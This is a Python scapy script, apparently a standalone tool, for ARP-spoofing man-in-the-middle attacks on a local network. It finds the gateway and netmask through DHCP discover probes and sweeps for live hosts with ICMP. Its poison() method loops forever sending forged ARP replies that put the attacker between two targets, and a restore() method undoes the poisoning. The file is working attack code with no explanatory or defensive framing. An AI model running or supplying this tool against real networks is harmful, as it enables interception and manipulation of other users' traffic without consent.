from scapy.layers.l2 import *
from scapy.layers.inet import *
from scapy.layers.dhcp import *
from scapy.all import *

BroadcastMAC = 'ff:ff:ff:ff:ff:ff'
UnknownMAC = '00:00:00:00:00:00'
BroadcastIP = '255.255.255.255'
UnknownIP = '0.0.0.0'
Localhost = '127.0.0.1'
sleep_time = 0.5
restore_pkt = 10


def get_ifaces():
    ifs = []
    for iface in get_if_list():
        if_addr = get_if_addr(iface)

        if if_addr == Localhost:
            continue

        if if_addr != UnknownIP:
            ifs.append(iface)

    return ifs


class Host:

    def __init__(self, ip=None, mac=None):

        self.ip = ip
        self.mac = mac

    def __str__(self):
        return f'IP[{self.ip}], MAC[{self.mac}]'


class Spoofer:

    def __init__(self, iface, timeout):
        if not iface:
            self._iface = conf.iface
        else:
            self._iface = iface

        self._timeout = timeout
        self._ip = get_if_addr(self._iface)
        self._mac = get_if_hwaddr(self._iface)
        _, self._raw_mac = get_if_raw_hwaddr(self._iface)

    def send_dhcp_discover(self, options):
        dhcp_discover = (Ether(dst=BroadcastMAC, src=self._mac)
                         / IP(src=UnknownIP, dst=BroadcastIP)
                         / UDP(sport=68, dport=67)
                         / BOOTP(chaddr=self._raw_mac, xid=RandInt(), flags="B")
                         / DHCP(options=options))

        conf.checkIPaddr = False
        ans = srp1(dhcp_discover, iface=self._iface, timeout=self._timeout)
        return ans

    def get_gateway(self):
        dhcp_options = [('message-type', 'discover'),
                        ('param_req_list', [3]),  # 3: Шлюз
                        'end']

        dhcp_offer = self.send_dhcp_discover(dhcp_options)

        if not dhcp_offer:
            return

        gateway = Host()
        for op in dhcp_offer['DHCP'].fields['options']:
            if op[0] == 'router':
                gateway.ip = op[1]
                gateway.mac = getmacbyip(gateway.ip)

        return gateway

    def get_mask(self):
        dec_mask = 0
        classic_mask = UnknownIP
        dhcp_options = [('message-type', 'discover'),
                        ('param_req_list', [1]),  # 1: Маска
                        'end']

        dhcp_offer = self.send_dhcp_discover(dhcp_options)

        if not dhcp_offer:
            return

        for op in dhcp_offer['DHCP'].fields['options']:
            if op[0] == 'subnet_mask':
                classic_mask = op[1]
                for part in op[1].split('.'):
                    dec_mask += bin(int(part)).count('1')

        return classic_mask, '/' + str(dec_mask)

    def get_alive_hosts(self, mask, gateway):
        hosts = []

        ans, unans = srp(Ether(dst=BroadcastMAC, src=self._mac)
                         / IP(dst=(gateway.ip + mask))
                         / ICMP(), timeout=self._timeout)

        if not ans:
            return

        for req, reply in ans:
            ip = reply['IP'].src
            mac = reply['Ether'].src
            hosts.append(Host(ip, mac))

        return hosts

    def poison(self, target1, target2):
        while True:
            sendp(Ether(src=self._mac, dst=target1.mac)
                  / ARP(op=2, psrc=target2.ip, pdst=target1.ip,
                        hwsrc=self._mac, hwdst=target1.mac))

            sendp(Ether(src=self._mac, dst=target2.mac)
                  / ARP(op=2, psrc=target1.ip, pdst=target2.ip,
                        hwsrc=self._mac, hwdst=target2.mac))
            time.sleep(sleep_time)

    def restore(self, target1, target2):
        for _ in range(restore_pkt):
            sendp(Ether(src=target2.mac, dst=target1.mac)
                  / ARP(op=2, psrc=target2.ip, pdst=target1.ip,
                        hwsrc=target2.mac, hwdst=target1.mac))

            sendp(Ether(src=target1.mac, dst=target2.mac)
                  / ARP(op=2, psrc=target1.ip, pdst=target2.ip,
                        hwsrc=target1.mac, hwdst=target2.mac))
            time.sleep(sleep_time)
